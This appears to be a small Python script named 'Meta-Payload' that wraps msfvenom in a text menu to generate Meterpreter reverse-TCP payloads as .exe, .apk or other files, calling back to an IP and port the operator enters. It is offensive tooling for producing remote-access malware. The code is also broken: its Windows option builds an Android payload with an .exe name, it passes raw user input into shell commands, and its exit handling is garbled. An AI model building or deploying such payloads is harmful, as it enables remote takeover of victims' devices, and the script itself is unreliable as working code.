from os import system
import sys
from time import sleep

system('clear')

				#requirement asking


def menu_all():	
							#the menu
	
	print (''' 				\033[1;36m __  __      _        ____             _                 _ 
				|  \/  | ___| |_ __ _|  _ \ __ _ _   _| | ___   __ _  __| |
				| |\/| |/ _ \ __/ _` | |_) / _` | | | | |/ _ \ / _` |/ _` |
				| |  | |  __/ || (_| |  __/ (_| | |_| | | (_) | (_| | (_| |
				|_|  |_|\___|\__\__,_|_|   \__,_|\__, |_|\___/ \__,_|\__,_|
								 |___/                     
''')

		
	print ('                                   \033[1;33m[\033[1;34m1\033[1;33m] \033[1;36mexe \033[1;33m--> \033[1;35mFor Windows')
	print ('                                   \033[1;33m[\033[1;34m2\033[1;33m] \033[1;36mapk \033[1;33m--> \033[1;35mFor Android')
	print ('				   \033[1;33m[\033[1;34m3\033[1;33m] \033[1;36mother')

						#input place

	x = input('\033[4;37mMeta-Payload\033[0;37m > ')
	if x == 'exit' :
		system('exit')
		system('clear')
							
				     #the menu's choise
							
					#for exe
	if x == '1' :
		ip = input('	[+] Enter Your IP : ')
		port = input('	[+] Enter Num of The port (default:4444) : ')
		nop = input('	[+] Choose Name For Your Payload : ')
		system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' R > '+nop+'.exe')
		print ('					The Payload Is Created Succeful ')
					#for apk
	if x == '2' :
		ip = input('	[+] Enter Your IP : ')
		port = input('	[+] Enter Num of The port (Default:4444) : ')
		nop = input('	[+] Choose Name For Your Payload : ')
		system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' R > '+nop+'.apk')
		print ('					The Payload Is Created Succeful ')			
					#for other format
	if x == '3' :
		ip = input('	[+] Enter Your IP : ')
		port = input('	[+] Enter Num of The port (default:4444) : ')
		nop = input('	[+] Choose Name For Your Payload : ')
		forma_t = input('	[+] Choose Format For Your Payload (Like apk or exe ...) :')
		system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+ip+' LPORT='+port+' R > '+nop+'.'+forma_t)
		print ('					The Payload Is Created Succeful ')
	if x == 'exit':
		exit()
		system ('clear')
		menu_all()
menu_all()


